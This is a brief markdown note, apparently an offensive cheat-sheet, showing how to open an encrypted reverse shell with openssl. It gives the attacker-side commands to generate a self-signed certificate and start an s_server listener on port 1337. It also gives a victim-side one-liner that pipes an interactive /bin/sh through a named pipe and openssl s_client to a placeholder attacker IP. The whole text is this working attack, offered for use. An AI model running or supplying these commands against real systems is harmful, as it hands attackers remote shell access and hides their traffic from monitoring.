# How to create a reverse shell on target with openssl
One could argue that this is moot if you're already doing deeds on the
target over plaintext, but whatev.

## create a certificate from attacker
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

## start listener from attacker 
```
openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
```

## must have cert.pem on victim
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```
